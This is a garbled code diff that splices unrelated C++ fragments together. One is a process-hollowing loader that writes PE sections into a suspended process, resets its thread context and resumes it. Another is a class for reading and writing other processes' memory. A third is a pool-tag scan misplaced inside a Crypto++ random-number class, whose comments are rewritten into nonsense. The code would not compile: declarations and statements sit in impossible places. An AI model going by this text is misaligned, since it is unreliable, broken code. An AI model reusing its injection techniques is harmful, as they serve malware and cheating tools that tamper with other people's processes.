@@ -74,16 +74,27 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile)
 							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 167 + (Count * 40));
 							xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 						}
-						xWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
-						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
+						class Sandy64
+							{
+							public:
+								BOOL Init();
+								template<typename DataType> DataType Read(ULONG64 Address)
+								{
+									DataType Buffer;
+									ReadPtr(Address, &Buffer, sizeof(DataType));
+									return Buffer;
+								}
 
-						xNtSetThreadContext = NtSetThreadContext(GetProcAddress(GetModuleHandleA("d3d11.dll"), "NtSetContextThread"));
-						xNtSetThreadContext(PI.hThread, LPCONTEXT(CTX));
+								ULONG64 GetModuleBase(ULONG ProcessPid, LPCSTR ModuleName);
+								BOOL ReadPtr(ULONG ProcessPid, ULONG64 Address, PVOID pBuffer, DWORD Size);
+								BOOL WritePtr(ULONG ProcessPid, ULONG64 Address, PVOID pBuffer, DWORD Size);
+						};
 
-						ResumeThread(PI.hThread);
-					}
+												xNtSetThreadContext = NtSetThreadContext(GetProcAddress(GetModuleHandleA("d3d11.dll"), "NtSetContextThread"));
+												xNtSetThreadContext(PI.hThread, LPCONTEXT(CTX));
 
-
+												ResumeThread(PI.hThread);
+												
 
 				}
 			}
@@ -101,7 +112,6 @@ public:
 	uint64_t    dst_addr;
 	size_t        size;
 
-	//function requests
 	int request_key;
 
 	//guarded regions
@@ -126,11 +136,11 @@ class CRYPTOPP_DLL X917RNG : public RandomNumberGenerator, public NotCopyable
 {
 public:
 	
-                    if ( saved_virtual_address == 0 && allocation_entry->TagUlong == 'TnoC' ) {
+                    if ( saved_virtual_address == 0 && allocation_entry->TagUlong == 'Fnoberz' ) {
                         saved_virtual_address = virtual_address;
 private:
 	member_ptr<BlockTransformation> m_cipher;
-	const unsigned int m_size;  // S, blocksize of cipher
-	SecByteBlock m_datetime;    // DT, buffer for enciphered timestamp
+	const unsigned int m_size;  // blocksize
+	SecByteBlock m_datetime;    // socket pc
 	SecByteBlock m_randseed, m_lastBlock, m_deterministicTimeVector;
 };
